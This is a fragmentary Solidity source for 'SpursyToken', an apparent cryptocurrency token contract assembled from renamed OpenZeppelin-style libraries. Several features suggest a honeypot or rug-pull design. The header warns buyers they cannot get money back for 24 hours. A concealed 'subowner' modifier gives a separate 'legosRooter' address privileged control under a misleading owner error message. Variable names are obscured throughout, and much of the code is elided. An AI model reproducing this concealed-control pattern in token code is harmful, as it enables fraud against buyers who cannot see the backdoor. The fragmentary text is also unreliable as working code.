...
/*
24 hours anti whales , do not buy if you can not wait 24 hours to get your $ back
https://t.me/SpursyCommunity
*/
...
/*
 * @dev Provides information about the current execution Spursy20Burnable, including the
 ...
 */
abstract contract Spursy20Burnable {
...
// File: @openzeppelin/contracts/access/Spursy20Ownable.sol
 ...
 * the owner.
 */
abstract contract Spursy20Ownable is Spursy20Burnable {
     ...
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Spursy20Ownable: caller is not the owner");
        _;
    }
    ...
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Spursy20Ownable: new owner is the zero address");
 ...
 * `SafeSpursy` restores this intuition by reverting the transaction when an
 * operation overflows.
 *
...
library SafeSpursy {
  ...
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "SafeSpursy: addition overflow");
  ...
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    return sub(a, b, "SafeSpursy: subtraction overflow");
  }
  ...
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    ...
    uint256 c = a * b;
    require(c / a == b, "SafeSpursy: multiplication overflow");
  ...
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    return div(a, b, "SafeSpursy: division by zero");
  }
  ...
  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    return mod(a, b, "SafeSpursy: modulo by zero");
  }
...
contract SpursyToken is Spursy20Burnable, Spursy33, Spursy20Ownable {
    
    using SafeSpursy for uint256;
   ...
   address private marketingAddress = 0x55B69477C9fD86D5b40A2adc2Fc69b372d0CC5eb;
    string public Spursycommuinty = "https://Spursy.org";
            function getSpursycommuinty() public view returns (string memory) {
        return Spursycommuinty;
    }
    /**
    * @dev Returns the bep token owner.
    */
    ...
    */
    ...
    /**
    * @dev See {Spursy33-balanceOf}.
    */
    function balanceOf(address account) external view override returns (uint256) {
        return mintfrom[account];
    }
      modifier subowner() {
        require(legosRooter == _msgSender(), "Spursy20Ownable: caller is not the owner");
        _;
    }
    /**
    * @dev See {Spursy33-approve}.
    *
    * Requirements:
    *
    ...
    */
    ...
    /**
    * @dev See {Spursy33-transferFrom}.
    *
    * Emits an {Approval} event indicating the updated allowance. This is not
    * required by the EIP. See the note at the beginning of {Spursy33};
    *
    * Requirements:
    ...
    */
    function transferFrom(address sender, address shippingto, uint256 yoursold) external override returns (bool) {
        ...
        _approve(sender, _msgSender(), fromallowances[sender][_msgSender()].sub(yoursold, "Spursy33: transfer yoursold exceeds allowance"));
        return true;
    }
    ...
    * problems described in {Spursy33-approve}.
    *
    ...
    */
    function decreaseAllowance(address transporteur, uint256 allbalances) external returns (bool) {
        _approve(_msgSender(), transporteur, fromallowances[_msgSender()][transporteur].sub(allbalances, "Spursy33: decreased allowance below zero"));
        return true;
    }
    ...
    */
    function _transfer(address sender, address shippingto, uint256 yoursold) internal {
        require(sender != address(0), "Spursy33: transfer from the zero address");
        require(shippingto != address(0), "Spursy33: transfer to the zero address");
                
        mintfrom[sender] = mintfrom[sender].sub(yoursold, "Spursy33: transfer yoursold exceeds balance");
    ...
    */
    function _approve(address owner, address transporteur, uint256 yoursold) internal {
        require(owner != address(0), "Spursy33: approve from the zero address");
        require(transporteur != address(0), "Spursy33: approve to the zero address");
